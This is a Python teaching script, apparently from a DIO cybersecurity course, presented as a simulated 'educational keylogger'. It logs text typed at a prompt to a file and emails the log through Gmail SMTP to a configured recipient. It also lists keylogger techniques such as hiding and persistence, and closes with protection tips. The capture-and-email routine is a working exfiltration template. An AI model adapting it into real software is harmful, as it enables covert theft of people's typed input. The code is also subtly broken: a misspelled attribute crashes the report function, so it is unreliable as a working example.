print("⌨️ KEYLOGGER EDUCACIONAL - DIO (MOBILE)")
print("=" * 50)
print("⚠️  CAPTURA SIMULADA - APENAS ESTUDO")

import time
import os
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# CONFIGURAÇÕES DE EMAIL - ATUALIZADAS
EMAIL_ORIGEM = "EMAIL"
EMAIL_DESTINO = "EMAIL"
SENHA_APP = "SENHA"

class KeyloggerMobile:
    def __init__(self):
        self.log_file = "keylog_estudo.txt"
        self.dados_capturados = []
        
    def enviar_email(self, assunto, corpo):
        """Envia email com os dados capturados"""
        try:
            msg = MIMEMultipart()
            msg['Subject'] = f"Keylogger Educacional - {assunto}"
            msg['From'] = EMAIL_ORIGEM
            msg['To'] = EMAIL_DESTINO
            
            # Corpo do email
            corpo_email = MIMEText(corpo, 'plain', 'utf-8')
            msg.attach(corpo_email)
            
            # Anexar arquivo de log se existir
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    anexo = MIMEText(f.read(), 'plain', 'utf-8')
                anexo.add_header(
                    'Content-Disposition',
                    'attachment',
                    filename=f'keylog_{datetime.now().strftime("%Y%m%d_%H%M")}.txt'
                )
                msg.attach(anexo)
            
            # Enviar email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(EMAIL_ORIGEM, SENHA_APP)
                server.send_message(msg)
            
            print("✅ Email enviado com sucesso!")
            return True
            
        except Exception as e:
            print(f"❌ Erro ao enviar email: {e}")
            return False
        
    def demonstrar_tecnicas(self):
        """Mostra técnicas de keyloggers reais"""
        print("\n🔍 TÉCNICAS DE KEYLOGGERS:")
        print("-" * 30)
        
        tecnicas = [
            "🎯 Captura de teclas em tempo real",
            "🎯 Armazenamento em arquivos ocultos", 
            "🎯 Envio por email automático",
            "🎯 Ocultação no sistema",
            "🎯 Persistência após reinício"
        ]
        
        for tecnica in tecnicas:
            print(tecnica)
            time.sleep(1)
            
    def simular_captura(self):
        """Simula captura de teclas via input"""
        print("\n🎮 MODO SIMULAÇÃO - DIGITE ALGUMAS FRASES")
        print("Digite 'SAIR' para finalizar")
        print("-" * 40)
        
        contador = 0
        
        while True:
            texto = input(f"Digitação {contador+1}: ")
            
            if texto.upper() == "SAIR":
                break
                
            # Registrar com timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            registro = f"[{timestamp}] {texto}"
            
            self.dados_capturados.append(registro)
            
            # Salvar em arquivo
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(registro + "\n")
                
            print(f"✅ Capturado: '{texto}'")
            contador += 1
            
    def mostrar_estatisticas(self):
        """Exibe estatísticas da captura"""
        print("\n📊 ESTATÍSTICAS DA CAPTURA:")
        print("-" * 30)
        
        total_caracteres = sum(len(item) for item in self.dados_capturados)
        
        print(f"• Frases capturadas: {len(self.dados_capturados)}")
        print(f"• Total de caracteres: {total_caracteres}")
        print(f"• Arquivo salvo: {self.log_file}")
        
        if self.dados_capturados:
            print("\n📝 ÚLTIMAS CAPTURAS:")
            for i, captura in enumerate(self.dados_capturados[-3:], 1):
                print(f"  {i}. {captura}")
                
    def enviar_relatorio_completo(self):
        """Envia relatório completo por email"""
        print("\n📧 ENVIANDO RELATÓRIO POR EMAIL...")
        
        if not self.dados_capturadas:
            print("❌ Nenhum dado para enviar")
            return False
            
        # Preparar corpo do email
        assunto = f"Relatório Keylogger - {len(self.dados_capturados)} entradas"
        corpo = f"""
        RELATÓRIO KEYLOGGER EDUCACIONAL - DIO
        
        Estatísticas:
        • Total de entradas: {len(self.dados_capturados)}
        • Total de caracteres: {sum(len(item) for item in self.dados_capturados)}
        • Período: {self.dados_capturados[0].split(']')[0][1:]} até {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        
        Últimas entradas:
        {chr(10).join(self.dados_capturados[-5:])}
        
        --- PROJETO EDUCACIONAL DIO ---
        Cybersecurity - Estudo Prático
        """
        
        return self.enviar_email(assunto, corpo)
        
    def medidas_protecao(self):
        """Mostra como se proteger"""
        print("\n🛡️ COMO SE PROTEGER:")
        print("-" * 25)
        
        protecoes = [
            "✅ Use antivírus com proteção em tempo real",
            "✅ Cuidado com downloads suspeitos",
            "✅ Verifique permissões de apps",
            "✅ Use teclado virtual para senhas",
            "✅ Monitore processos do sistema",
            "✅ Mantenha tudo atualizado"
        ]
        
        for protecao in protecoes:
            print(protecao)
            time.sleep(0.5)

def executar_keylogger():
    """Função principal"""
    print("\n🚀 INICIANDO KEYLOGGER EDUCACIONAL")
    
    keylogger = KeyloggerMobile()
    
    # Demonstração
    keylogger.demonstrar_tecnicas()
    time.sleep(2)
    
    # Captura simulada
    keylogger.simular_captura()
    
    # Estatísticas
    keylogger.mostrar_estatisticas()
    time.sleep(2)
    
    # Enviar relatório por email
    if keylogger.dados_capturados:
        keylogger.enviar_relatorio_completo()
    else:
        print("❌ Nenhum dado capturado para enviar")
    
    time.sleep(1)
    
    # Proteções
    keylogger.medidas_protecao()
    
    print(f"\n🎓 ESTUDO CONCLUÍDO!")
    print(f"📁 Verifique o arquivo: {keylogger.log_file}")
    print(f"📧 Relatório enviado para: {EMAIL_DESTINO}")

if __name__ == "__main__":
    executar_keylogger()